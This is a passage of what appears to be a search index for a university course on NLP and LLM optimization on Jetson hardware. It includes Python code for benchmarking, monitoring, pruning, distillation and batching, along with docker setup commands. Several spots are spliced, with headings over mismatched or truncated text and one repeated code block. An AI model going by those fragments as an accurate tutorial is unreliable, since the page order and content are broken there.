Trying loading strategy {i+1}...\")\n            model = strategy()\n            print(f\"\u2705 Model loaded with strategy {i+1}\")\n            return model\n        except Exception as e:\n            print(f\"\u274c Strategy {i+1} failed: {e}\")\n            clear_memory()\n\n    raise RuntimeError(\"All loading strategies failed\")\n\n# Usage\nmodel = load_model_with_fallback(\"gpt2-medium\")\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#performance-optimization","title":"Performance Optimization","text":"<pre><code># Enable optimizations\ntorch.backends.cudnn.benchmark = True  # For consistent input sizes\ntorch.backends.cudnn.deterministic = False  # For better performance\n\n# Use torch.compile (PyTorch 2.0+)\nif hasattr(torch, 'compile'):\n    model = torch.compile(model, mode=\"reduce-overhead\")\n    print(\"\ud83d\ude80 Model compiled for optimization\")\n\n# Optimize tokenizer\ntokenizer = AutoTokenizer.from_pretrained(\n    model_name,\n    use_fast=True,  # Use fast tokenizer\n    padding_side=\"left\"  # Better for generation\n)\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#performance-monitoring-tools","title":"\ud83d\udcca Performance Monitoring Tools","text":"<pre><code>import psutil\nimport time\nfrom contextlib import contextmanager\n\n@contextmanager\ndef system_monitor():\n    \"\"\"Monitor system resources during inference\"\"\"\n    # Initial readings\n    start_time = time.time()\n    start_cpu = psutil.cpu_percent(interval=None)\n    start_memory = psutil.virtual_memory().percent\n\n    if torch.cuda.is_available():\n        start_gpu_memory = torch.cuda.memory_allocated() / 1024**2\n        torch.cuda.reset_peak_memory_stats()\n\n    try:\n        yield\n    finally:\n        # Final readings\n        end_time = time.time()\n        end_cpu = psutil.cpu_percent(interval=None)\n        end_memory = psutil.virtual_memory().percent\n\n        print(f\"\\n\ud83d\udcca System Performance:\")\n        print(f\"\u23f1\ufe0f  Execution time: {end_time - start_time:.3f}s\")\n        print(f\"\ud83d\udcbb CPU usage: {end_cpu:.1f}%\")\n        print(f\"\ud83e\udde0 RAM usage: {end_memory:.1f}%\")\n\n        if torch.cuda.is_available():\n            current_gpu = torch.cuda.memory_allocated() / 1024**2\n            peak_gpu = torch.cuda.max_memory_allocated() / 1024**2\n            print(f\"\ud83c\udfae GPU memory current: {current_gpu:.1f} MB\")\n            print(f\"\ud83d\udd1d GPU memory peak: {peak_gpu:.1f} MB\")\n\n# Usage example\nwith system_monitor():\n    result = model.generate(**inputs)\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#jetson-specific-optimizations","title":"\ud83c\udfaf Jetson-Specific Optimizations","text":"<pre><code># Check Jetson model and optimize accordingly\ndef get_jetson_config():\n    try:\n        with open('/proc/device-tree/model', 'r') as f:\n            model = f.read().strip()\n\n        if 'Orin Nano' in model:\n            return {\n                'max_memory_gb': 6,  # Leave 2GB for system\n                'optimal_batch_size': 4,\n                'use_fp16': True,\n                'enable_flash_attention': False  # Not supported on older CUDA\n            }\n        elif 'Orin NX' in model:\n            return {\n                'max_memory_gb': 14,\n                'optimal_batch_size': 8,\n                'use_fp16': True,\n                'enable_flash_attention': True\n            }\n        else:\n            return {\n                'max_memory_gb': 4,\n                'optimal_batch_size': 2,\n                'use_fp16': True,\n                'enable_flash_attention': False\n            }\n    except:\n        # Fallback for non-Jetson systems\n        return {\n            'max_memory_gb': 8,\n            'optimal_batch_size': 8,\n            'use_fp16': True,\n            'enable_flash_attention': True\n        }\n\n# Apply Jetson-specific settings\nconfig = get_jetson_config()\nprint(f\"\ud83e\udd16 Detected configuration: {config}\")\n\n# Use configuration in model loading\nmodel = AutoModelForCausalLM.from_pretrained(\n    model_name,\n    torch_dtype=torch.float16 if config['use_fp16'] else torch.float32,\n    device_map=\"auto\",\n    max_memory={0: f\"{config['max_memory_gb']}GB\"}\n)\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#benchmarking-framework","title":"\ud83d\udcc8 Benchmarking Framework","text":"<pre><code>class TransformerBenchmark:\n    def __init__(self, model_name, device=\"auto\"):\n        self.model_name = model_name\n        self.device = device\n        self.results = []\n\n    def benchmark_task(self, task_name, task_func, inputs, num_runs=5):\n        \"\"\"Benchmark a specific task\"\"\"\n        print(f\"\\n\ud83e\uddea Benchmarking {task_name}...\")\n\n        times = []\n        for run in range(num_runs):\n            start_time = time.time()\n            result = task_func(inputs)\n            end_time = time.time()\n\n            run_time = end_time - start_time\n            times.append(run_time)\n\n            if run == 0:  # Show first result\n                print(f\"\ud83d\udcdd Sample output: {str(result)[:100]}...\")\n\n        avg_time = sum(times) / len(times)\n        std_time = (sum((t - avg_time) ** 2 for t in times) / len(times)) ** 0.5\n\n        self.results.append({\n            'task': task_name,\n            'avg_time': avg_time,\n            'std_time': std_time,\n            'min_time': min(times),\n            'max_time': max(times),\n            'times': times\n        })\n\n        print(f\"\u23f1\ufe0f  Average: {avg_time:.3f}\u00b1{std_time:.3f}s\")\n        return avg_time\n\n    def generate_report(self):\n        \"\"\"Generate comprehensive benchmark report\"\"\"\n        print(\"\\n\ud83d\udcca BENCHMARK REPORT\")\n        print(\"=\" * 50)\n        print(f\"Model: {self.model_name}\")\n        print(f\"Device: {self.device}\")\n        print(f\"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\")\n        print(\"\\n\ud83d\udcc8 Results:\")\n\n        for result in self.results:\n            print(f\"\\n\ud83c\udfaf {result['task']}:\")\n            print(f\"   Average: {result['avg_time']:.3f}s\")\n            print(f\"   Std Dev: {result['std_time']:.3f}s\")\n            print(f\"   Range: {result['min_time']:.3f}s - {result['max_time']:.3f}s\")\n\n        # Find best and worst performing tasks\n        if self.results:\n            best = min(self.results, key=lambda x: x['avg_time'])\n            worst = max(self.results, key=lambda x: x['avg_time'])\n\n            print(f\"\\n\ud83c\udfc6 Fastest task: {best['task']} ({best['avg_time']:.3f}s)\")\n            print(f\"\ud83d\udc0c Slowest task: {worst['task']} ({worst['avg_time']:.3f}s)\")\n\n            if len(self.results) &gt; 1:\n                speedup = worst['avg_time'] / best['avg_time']\n                print(f\"\u26a1 Performance ratio: {speedup:.2f}x\")\n\n# Example usage\nbenchmark = TransformerBenchmark(\"distilbert-base-uncased\")\n\n# Define benchmark tasks\ndef sentiment_task(texts):\n    classifier = pipeline(\"sentiment-analysis\")\n    return [classifier(text) for text in texts]\n\ndef generation_task(prompts):\n    generator = pipeline(\"text-generation\", model=\"gpt2\")\n    return [generator(prompt, max_length=50) for prompt in prompts]\n\n# Run benchmarks\ntest_texts = [\"This is a test sentence.\"] * 5\ntest_prompts = [\"The future of AI\"] * 3\n\nbenchmark.benchmark_task(\"Sentiment Analysis\", sentiment_task, test_texts)\nbenchmark.benchmark_task(\"Text Generation\", generation_task, test_prompts)\n\n# Generate report\nbenchmark.generate_report()\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/","title":"\ud83e\udde0 NLP Applications &amp; LLM Optimization on Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p> <p>This tutorial covers essential techniques for deploying and optimizing NLP applications on Jetson devices. You'll learn about various optimization strategies, benchmark different NLP tasks, and implement production-ready solutions. All examples and implementations are combined into a single, easy-to-use command-line tool (<code>jetson_nlp_toolkit.py</code>) that you can use to experiment with different approaches.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#why-optimize-llms-on-jetson","title":"\ud83e\udd16 Why Optimize LLMs on Jetson?","text":"<p>Jetson Orin Nano has limited power and memory (e.g., 8GB), so optimizing models for:</p> <ul> <li>\ud83d\udcbe Lower memory usage</li> <li>\u26a1 Faster inference latency</li> <li>\ud83d\udd0c Better energy efficiency</li> </ul> <p>Enables real-time NLP applications at the edge.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#optimization-strategies","title":"\ud83d\ude80 Optimization Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-model-quantization","title":"\u2705 1. Model Quantization","text":"<p>Quantization reduces the precision of model weights (e.g., FP32 \u2192 INT8 or Q4) to shrink size and improve inference speed.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#what-is-q4_k_m","title":"\ud83d\udd0d What is Q4_K_M?","text":"<ul> <li>Q4 = 4-bit quantization (16x smaller than FP32)</li> <li>K = Grouped quantization for accuracy preservation</li> <li>M = Variant with optimized metadata handling</li> </ul> <p>Q4_K_M is commonly used in <code>llama.cpp</code> for best quality/speed tradeoff on Jetson.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-use-smaller-or-distilled-models","title":"\u2705 2. Use Smaller or Distilled Models","text":"<p>Distillation creates smaller models (e.g., DistilBERT) by mimicking larger models while reducing parameters.</p> <ul> <li>Faster and lighter than full LLMs</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#3-use-tensorrt-or-onnx-for-inference","title":"\u2705 3. Use TensorRT or ONNX for Inference","text":"<p>Export HuggingFace or PyTorch models to ONNX and use:</p> <ul> <li><code>onnxruntime-gpu</code></li> <li><code>TensorRT</code> engines (for low latency and reduced memory use)</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#4-offload-selected-layers","title":"\u2705 4. Offload Selected Layers","text":"<p>For large models, tools like <code>llama-cpp-python</code> allow setting <code>n_gpu_layers</code> to control how many transformer layers use GPU vs CPU.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#nlp-application-evaluation-labs","title":"\ud83d\udcca NLP Application Evaluation Labs","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#all-in-one-nlp-toolkit","title":"\ud83d\udee0\ufe0f All-in-One NLP Toolkit","text":"<p>We've created a comprehensive Python script that combines all the NLP applications, optimization techniques, and evaluation methods from this tutorial into a single command-line tool.</p> <p>&lt;!-- #### Installation</p> <pre><code># Clone the repository if you haven't already\ngit clone https://github.com/yourusername/edgeAI.git\ncd edgeAI\n\n# Install dependencies\npip install torch transformers datasets evaluate rouge-score fastapi uvicorn aiohttp psutil matplotlib numpy\n\n# Optional dependencies for specific features\npip install redis llama-cpp-python requests\n``` --&gt;\n\n#### Usage\n\nThe toolkit provides several commands for different NLP tasks and optimizations:\n\n```bash\npython jetson_nlp_toolkit.py [command] [options]\n</code></pre> <p>Available commands: - <code>evaluate</code>: Run NLP evaluation suite - <code>optimize</code>: Run optimization benchmarks - <code>llm</code>: Compare LLM inference methods - <code>server</code>: Run NLP server - <code>loadtest</code>: Run load tests against NLP server</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#examples","title":"Examples","text":"<p>1. Evaluate NLP Tasks:</p> <pre><code># Run full evaluation suite\npython jetson_nlp_toolkit.py evaluate --task all\n\n# Evaluate specific task (sentiment, qa, summarization, ner)\npython jetson_nlp_toolkit.py evaluate --task sentiment\n\n# Save results to custom file\npython jetson_nlp_toolkit.py evaluate --task all --output my_results.json\n</code></pre> <p>2. Benchmark Optimization Techniques:</p> <pre><code># Compare quantization methods\npython jetson_nlp_toolkit.py optimize --method quantization\n\n# Test model pruning\npython jetson_nlp_toolkit.py optimize --method pruning --ratio 0.3\n\n# Use custom model\npython jetson_nlp_toolkit.py optimize --method all --model bert-base-uncased\n</code></pre> <p>3. Compare LLM Inference Methods:</p> <pre><code># Test all inference methods\npython jetson_nlp_toolkit.py llm --method all\n\n# Test specific method with custom model\npython jetson_nlp_toolkit.py llm --method huggingface --model gpt2\n\n# Test llama.cpp with custom model path\npython jetson_nlp_toolkit.py llm --method llamacpp --model-path /path/to/model.gguf\n</code></pre> <p>4. Run NLP Server:</p> <pre><code># Start server on default port (8000)\npython jetson_nlp_toolkit.py server\n\n# Specify host and port\npython jetson_nlp_toolkit.py server --host 127.0.0.1 --port 5000\n</code></pre> <p>5. Run Load Tests:</p> <pre><code># Test server with default settings\npython jetson_nlp_toolkit.py loadtest\n\n# Custom test configuration\npython jetson_nlp_toolkit.py loadtest --url http://localhost:8000 --concurrent 20 --requests 500\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#lab-1-multi-application-nlp-benchmark-suite","title":"\ud83e\uddea Lab 1: Multi-Application NLP Benchmark Suite","text":"<p>Objective: Evaluate and compare different NLP applications on Jetson using standardized datasets</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#setup-evaluation-environment","title":"Setup Evaluation Environment","text":"<pre><code># Create evaluation container\ndocker run --rm -it --runtime nvidia \\\n  -v $(pwd)/nlp_eval:/workspace \\\n  -v $(pwd)/datasets:/datasets \\\n  nvcr.io/nvidia/pytorch:24.04-py3 /bin/bash\n\n# Install evaluation dependencies\npip install transformers datasets evaluate rouge-score sacrebleu spacy\npython -m spacy download en_core_web_sm\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#run-comprehensive-evaluation","title":"Run Comprehensive Evaluation","text":"<p>Use the  compiled)"},{"location":"curriculum/07_nlp_applications_llm_optimization/#ollama-container","title":"Ollama Container:","text":"<pre><code>docker run --rm -it --network host \\\n  -v ollama:/root/.ollama ollama/ollama\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#run-llm-inference-comparison","title":"\ud83d\udd01 Run LLM Inference Comparison","text":"<p>Use the  to run NLP evaluations: <pre><code># Run all NLP evaluations\npython jetson_nlp_toolkit.py evaluate --task all\n\n# Run specific task evaluations\npython jetson_nlp_toolkit.py evaluate --task sentiment\npython jetson_nlp_toolkit.py evaluate --task qa\npython jetson_nlp_toolkit.py evaluate --task summarization\npython jetson_nlp_toolkit.py evaluate --task ner\n\n# Save results to custom file\npython jetson_nlp_toolkit.py evaluate --output my_results.json\n</code></pre> <p>The evaluation suite includes: - Sentiment Analysis: IMDB dataset with DistilBERT - Question Answering: SQuAD dataset with DistilBERT - Text Summarization: CNN/DailyMail with T5-small - Named Entity Recognition: CoNLL-2003 with BERT-large</p> <p>Each evaluation measures: - Accuracy/F1 scores - Latency and throughput - GPU memory usage - CPU utilization</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#lab-2-advanced-optimization-techniques","title":"\ud83e\uddea Lab 2: Advanced Optimization Techniques","text":"<p>Objective: Implement and compare advanced optimization strategies for NLP models on Jetson</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#run-optimization-benchmarks","title":"Run Optimization Benchmarks","text":"<p>Use the mory usage - Model loading time - Response quality"},{"location":"curriculum/07_nlp_applications_llm_optimization/#record-results","title":"\ud83d\udcca Record Results","text":"Method Latency (s) Tokens/sec GPU Mem (MB) HuggingFace PyTorch llama-cpp-python Ollama REST API <p>Use <code>tegrastats</code> or <code>jtop</code> to observe GPU memory and CPU usage during inference.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#lab-deliverables","title":"\ud83d\udccb Lab Deliverables","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-1-multi-application-benchmark","title":"For Lab 1 (Multi-Application Benchmark):","text":"<ul> <li>Completed evaluation results JSON file</li> <li>Performance comparison charts for all NLP tasks</li> <li>Analysis report identifying best models for each task on Jetson</li> <li>Resource utilization graphs (<code>tegrastats</code> screenshots)</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-2-optimization-techniques","title":"For Lab 2 (Optimization Techniques):","text":"<ul> <li>Quantization comparison table</li> <li>Memory usage analysis</li> <li>Speedup and compression ratio calculations</li> <li>Recommendations for production deployment</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#for-lab-3-llm-container-comparison","title":"For Lab 3 (LLM Container Comparison):","text":"<ul> <li>Completed benchmark table</li> <li>Screenshots of <code>tegrastats</code> during inference</li> <li>Analysis: Which approach is fastest, lightest, and most accurate for Jetson?</li> </ul>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#advanced-nlp-optimization-strategies","title":"\ud83c\udfaf Advanced NLP Optimization Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-model-pruning-for-jetson","title":"1. \ud83d\udd27 Model Pruning for Jetson","text":"<pre><code># model_pruning.py\nimport torch\nimport torch.nn.utils.prune as prune\nfrom transformers import AutoModelForSequenceClassification\n\ndef prune_model(model, pruning_ratio=0.2):\n    \"\"\"Apply structured pruning to transformer model\"\"\"\n    for name, module in model.named_modules():\n        if isinstance(module, torch.nn.Linear):\n            prune.l1_unstructured(module, name='weight', amount=pruning_ratio)\n            prune.remove(module, 'weight')\n\n    return model\n\n# Example usage\nmodel = AutoModelForSequenceClassification.from_pretrained(\"distilbert-base-uncased\")\npruned_model = prune_model(model, pruning_ratio=0.3)\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-knowledge-distillation","title":"2. \ud83d\ude80 Knowledge Distillation","text":"<pre><code># knowledge_distillation.py\nimport torch\nimport torch.nn as nn\nfrom transformers import AutoModelForSequenceClassification, AutoTokenizer\n\nclass DistillationTrainer:\n    def __init__(self, teacher_model, student_model, temperature=3.0, alpha=0.7):\n        self.teacher = teacher_model\n        self.student = student_model\n        self.temperature = temperature\n        self.alpha = alpha\n        self.kl_loss = nn.KLDivLoss(reduction='batchmean')\n        self.ce_loss = nn.CrossEntropyLoss()\n\n    def distillation_loss(self, student_logits, teacher_logits, labels):\n        \"\"\"Calculate distillation loss\"\"\"\n        # Soft targets from teacher\n        teacher_probs = torch.softmax(teacher_logits / self.temperature, dim=1)\n        student_log_probs = torch.log_softmax(student_logits / self.temperature, dim=1)\n\n        # Distillation loss\n        distill_loss = self.kl_loss(student_log_probs, teacher_probs) * (self.temperature ** 2)\n\n        # Hard target loss\n        hard_loss = self.ce_loss(student_logits, labels)\n\n        # Combined loss\n        total_loss = self.alpha * distill_loss + (1 - self.alpha) * hard_loss\n        return total_loss\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#3-dynamic-batching-for-real-time-inference","title":"3. \ud83d\udd04 Dynamic Batching for Real-time Inference","text":"<pre><code># dynamic_batching.py\nimport asyncio\nimport time\nfrom collections import deque\nfrom typing import List, Tuple\n\nclass DynamicBatcher:\n    def __init__(self, model, tokenizer, max_batch_size=8, max_wait_time=0.1):\n        self.model = model\n        self.tokenizer = tokenizer\n        self.max_batch_size = max_batch_size\n        self.max_wait_time = max_wait_time\n        self.request_queue = deque()\n        self.processing = False\n\n    async def add_request(self, text: str) -&gt; str:\n        \"\"\"Add inference request to queue\"\"\"\n        future = asyncio.Future()\n        self.request_queue.append((text, future))\n\n        if not self.processing:\n            asyncio.create_task(self.process_batch())\n\n        return await future\n\n    async def process_batch(self):\n        \"\"\"Process requests in batches\"\"\"\n        self.processing = True\n\n        while self.request_queue:\n            batch = []\n            futures = []\n            start_time = time.time()\n\n            # Collect batch\n            while (len(batch) &lt; self.max_batch_size and \n                   self.request_queue and \n                   (time.time() - start_time) &lt; self.max_wait_time):\n\n                text, future = self.request_queue.popleft()\n                batch.append(text)\n                futures.append(future)\n\n                if not self.request_queue:\n                    await asyncio.sleep(0.01)  # Small wait for more requests\n\n            if batch:\n                # Process batch\n                results = await self.inference_batch(batch)\n\n                # Return results\n                for future, result in zip(futures, results):\n                    future.set_result(result)\n\n        self.processing = False\n\n    async def inference_batch(self, texts: List[str]) -&gt; List[str]:\n        \"\"\"Run inference on batch\"\"\"\n        inputs = self.tokenizer(\n            texts, \n            return_tensors=\"pt\", \n            padding=True, \n            truncation=True,\n            max_length=512\n        )\n\n        with torch.no_grad():\n            outputs = self.model(**inputs)\n            predictions = torch.argmax(outputs.logits, dim=-1)\n\n        return [f\"Prediction: {pred.item()}\" for pred in predictions]\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#4-real-time-performance-monitoring","title":"4. \ud83d\udcca Real-time Performance Monitoring","text":"<pre><code># performance_monitor.py\nimport time\nimport psutil\nimport torch\nfrom collections import deque\nimport matplotlib.pyplot as plt\nfrom threading import Thread\n\nclass JetsonNLPMonitor:\n    def __init__(self, window_size=100):\n        self.window_size = window_size\n        self.metrics = {\n            'latency': deque(maxlen=window_size),\n            'throughput': deque(maxlen=window_size),\n            'gpu_memory': deque(maxlen=window_size),\n            'cpu_usage': deque(maxlen=window_size),\n            'timestamps': deque(maxlen=window_size)\n        }\n        self.monitoring = False\n\n    def start_monitoring(self):\n        \"\"\"Start background monitoring\"\"\"\n        self.monitoring = True\n        monitor_thread = Thread(target=self._monitor_loop)\n        monitor_thread.daemon = True\n        monitor_thread.start()\n\n    def stop_monitoring(self):\n        \"\"\"Stop monitoring\"\"\"\n        self.monitoring = False\n\n    def _monitor_loop(self):\n        \"\"\"Background monitoring loop\"\"\"\n        while self.monitoring:\n            timestamp = time.time()\n\n            # GPU memory\n            if torch.cuda.is_available():\n                gpu_memory = torch.cuda.memory_allocated() / 1024 / 1024  # MB\n            else:\n                gpu_memory = 0\n\n            # CPU usage\n            cpu_usage = psutil.cpu_percent()\n\n            self.metrics['gpu_memory'].append(gpu_memory)\n            self.metrics['cpu_usage'].append(cpu_usage)\n            self.metrics['timestamps'].append(timestamp)\n\n            time.sleep(0.1)  # Monitor every 100ms\n\n    def log_inference(self, latency, batch_size=1):\n        \"\"\"Log inference metrics\"\"\"\n        self.metrics['latency'].append(latency * 1000)  # Convert to ms\n        self.metrics['throughput'].append(batch_size / latency)  # samples/sec\n\n    def get_stats(self):\n        \"\"\"Get current statistics\"\"\"\n        if not self.metrics['latency']:\n            return {}\n\n        return {\n            'avg_latency_ms': sum(self.metrics['latency']) / len(self.metrics['latency']),\n            'avg_throughput': sum(self.metrics['throughput']) / len(self.metrics['throughput']),\n            'avg_gpu_memory_mb': sum(self.metrics['gpu_memory']) / len(self.metrics['gpu_memory']),\n            'avg_cpu_usage': sum(self.metrics['cpu_usage']) / len(self.metrics['cpu_usage']),\n            'total_inferences': len(self.metrics['latency'])\n        }\n\n    def plot_metrics(self, save_path=\"nlp_performance.png\"):\n        \"\"\"Plot performance metrics\"\"\"\n        fig, axes = plt.subplots(2, 2, figsize=(12, 8))\n\n        # Latency\n        axes[0, 0].plot(list(self.metrics['latency']))\n        axes[0, 0].set_title('Inference Latency (ms)')\n        axes[0, 0].set_ylabel('Latency (ms)')\n\n        # Throughput\n        axes[0, 1].plot(list(self.metrics['throughput']))\n        axes[0, 1].set_title('Throughput (samples/sec)')\n        axes[0, 1].set_ylabel('Samples/sec')\n\n        # GPU Memory\n        axes[1, 0].plot(list(self.metrics['gpu_memory']))\n        axes[1, 0].set_title('GPU Memory Usage (MB)')\n        axes[1, 0].set_ylabel('Memory (MB)')\n\n        # CPU Usage\n        axes[1, 1].plot(list(self.metrics['cpu_usage']))\n        axes[1, 1].set_title('CPU Usage (%)')\n        axes[1, 1].set_ylabel('CPU %')\n\n        plt.tight_layout()\n        plt.savefig(save_path)\n        plt.show()\n\n        print(f\"\ud83d\udcca Performance plots saved to {save_path}\")\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#bonus-lab-export-huggingface-onnx-tensorrt","title":"\ud83e\uddea Bonus Lab: Export HuggingFace \u2192 ONNX \u2192 TensorRT","text":"<ol> <li>Export:</li> </ol> <pre><code>import torch\nfrom transformers import AutoModelForSequenceClassification\nmodel = AutoModelForSequenceClassification.from_pretrained(\"distilbert-base-uncased\")\ndummy = torch.randint(0, 100, (1, 64))\ntorch.onnx.export(model, (dummy,), \"model.onnx\", input_names=[\"input_ids\"])\n</code></pre> <ol> <li>Convert:</li> </ol> <pre><code>trtexec --onnx=model.onnx --saveEngine=model.trt\n</code></pre> <ol> <li>Run using TensorRT Python bindings or <code>onnxruntime-gpu</code></li> </ol>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#production-deployment-strategies","title":"\ud83d\ude80 Production Deployment Strategies","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#1-multi-stage-docker-optimization","title":"1. \ud83d\udc33 Multi-Stage Docker Optimization","text":"<pre><code># Dockerfile.nlp-production\n# Multi-stage build for optimized NLP deployment\nFROM nvcr.io/nvidia/pytorch:24.04-py3 as builder\n\n# Install build dependencies\nRUN pip install transformers torch-audio torchaudio torchvision\nRUN pip install onnx onnxruntime-gpu tensorrt\n\n# Copy and optimize models\nCOPY models/ /tmp/models/\nCOPY scripts/optimize_models.py /tmp/\nRUN python /tmp/optimize_models.py\n\n# Production stage\nFROM nvcr.io/nvidia/pytorch:24.04-py3\n\n# Install only runtime dependencies\nRUN pip install --no-cache-dir \\\n    transformers==4.36.0 \\\n    torch==2.1.0 \\\n    onnxruntime-gpu==1.16.0 \\\n    fastapi==0.104.0 \\\n    uvicorn==0.24.0\n\n# Copy optimized models\nCOPY --from=builder /tmp/optimized_models/ /app/models/\nCOPY src/ /app/src/\n\nWORKDIR /app\nEXPOSE 8000\n\nCMD [\"uvicorn\", \"src.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#2-fastapi-production-server","title":"2. \ud83c\udf10 FastAPI Production Server","text":"<p>Use the  to compare different optimization methods: <pre><code># Run all optimization benchmarks\npython jetson_nlp_toolkit.py optimize --method all\n\n# Run specific optimization methods\npython jetson_nlp_toolkit.py optimize --method quantization\npython jetson_nlp_toolkit.py optimize --method pruning --ratio 0.3\npython jetson_nlp_toolkit.py optimize --method distillation\n\n# Benchmark with custom model\npython jetson_nlp_toolkit.py optimize --model \"bert-base-uncased\" --samples 100\n\n# Save optimization results\npython jetson_nlp_toolkit.py optimize --output optimization_results.json\n</code></pre> <p>The optimization benchmark compares: - FP32: Full precision baseline - FP16: Half precision for GPU acceleration - INT8 Dynamic: Dynamic quantization for CPU - TorchScript: Graph optimization - Model Pruning: Structured weight pruning - Knowledge Distillation: Teacher-student training</p> <p>Metrics measured: - Average latency per sample - Throughput (samples/second) - Memory usage - Model size compression - Speedup vs baseline</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#lab-3-compare-llm-inference-in-containers","title":"\ud83e\uddea Lab 3: Compare LLM Inference in Containers","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#objective","title":"\ud83c\udfaf Objective","text":"<p>Evaluate inference speed and memory usage for different LLM deployment methods on Jetson inside Docker containers.</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#setup-container-for-each-method","title":"\ud83d\udd27 Setup Container for Each Method","text":""},{"location":"curriculum/07_nlp_applications_llm_optimization/#huggingface-container","title":"HuggingFace Container:","text":"<pre><code>docker run --rm -it --runtime nvidia \\\n  -v $(pwd):/workspace \\\n  nvcr.io/nvidia/pytorch:24.04-py3 /bin/bash\n</code></pre> <p>Inside container:</p> <pre><code>pip install transformers accelerate torch\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#llamacpp-container","title":"llama.cpp Container:","text":"<pre><code>docker run --rm -it --runtime nvidia \\\n  -v $(pwd)/models:/models \\\n  jetson-llama-cpp /bin/bash\n</code></pre> <p>(Assumes container has CUDA + llama.cpp compiled)</p>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#ollama-container_1","title":"Ollama Container:","text":"<pre><code>docker run --rm -it --network host \\\n  -v ollama:/root/.ollama ollama/ollama\n</code></pre>"},{"location":"curriculum/07_nlp_applications_llm_optimization/#run-llm-inference-comparison_1","title":"\ud83d\udd01 Run LLM Inference Comparison","text":"<p>Use the ime Performance Monitoring <pre><code># performance_monitor.py\nimport time\nimport psutil\nimport torch\nfrom collections import deque\nimport matplotlib.pyplot as plt\nfrom threading import Thread\n\nclass JetsonNLPMonitor:\n    def __init__(self, window_size=100):\n        self.window_size = window_size\n        self.metrics = {\n            'latency': deque(maxlen=window_size),\n            'throughput': deque(maxlen=window_size),\n            'gpu_memory': deque(maxlen=window_size),\n            'cpu_usage': deque(maxlen=window_size),\n            'timestamps': deque(maxlen=window_size)\n        }\n        self.monitoring = False\n\n    def start_monitoring(self):\n        \"\"\"Start background monitoring\"\"\"\n        self.monitoring = True\n        monitor_thread = Thread(target=self._monitor_loop)\n        monitor_thread.daemon = True\n        monitor_thread.start()\n\n    def stop_monitoring(self):\n        \"\"\"Stop monitoring\"\"\"\n        self.monitoring = False\n\n    def _monitor_loop(self):\n        \"\"\"Background monitoring loop\"\"\"\n        while self.monitoring:\n            timestamp = time.time()\n\n            # GPU memory\n            if torch.cuda.is_available():\n                gpu_memory = torch.cuda.memory_allocated() / 1024 / 1024  # MB\n            else:\n                gpu_memory = 0\n\n            # CPU usage\n            cpu_usage = psutil.cpu_percent()\n\n            self.metrics['gpu_memory'].append(gpu_memory)\n            self.metrics['cpu_usage'].append(cpu_usage)\n            self.metrics['timestamps'].append(timestamp)\n\n            time.sleep(0.1)  # Monitor every 100ms\n\n    def log_inference(self, latency, batch_size=1):\n        \"\"\"Log inference metrics\"\"\"\n        self.metrics['latency'].append(latency * 1000)  # Convert to ms\n        self.metrics['throughput'].append(batch_size / latency)  # samples/sec\n\n    def get_stats(self):\n        \"\"\"Get current statistics\"\"\"\n        if not self.metrics['latency']:\n            return {}\n\n        return {\n            'avg_latency_ms': sum(self.metrics['latency']) / len(self.metrics['latency']),\n            'avg_throughput': sum(self.metrics['throughput']) / len(self.metrics['throughput']),\n            'avg_gpu_memory_mb': sum(self.metrics['gpu_memory']) / len(self.metrics['gpu_memory']),\n            'avg_cpu_usage': sum(self.metrics['cpu_usage']) / len(self.metrics['cpu_usage']),\n            'total_inferences': len(self.metrics['latency'])\n        }\n\n    def plot_metrics(self, save_path=\"nlp_performance.png\"):\n        \"\"\"Plot performance metrics\"\"\"\n        fig, axes = plt.subplots(2, 2, figsize=(12, 8))\n\n        # Latency\n        axes[0, 0].plot(list(self.metrics['latency']))\n        axes[0, 0].set_title('Inference Latency (ms)')\n        axes[0, 0].set_ylabel('Latency (ms)')\n\n        # Throughput\n        axes[0, 1].plot(list(self.metrics['throughput']))\n        axes[0, 1].set_title('Throughput (samples/sec)')\n        axes[0, 1].set_ylabel('Samples/sec')\n\n        # GPU Memory\n        axes[1, 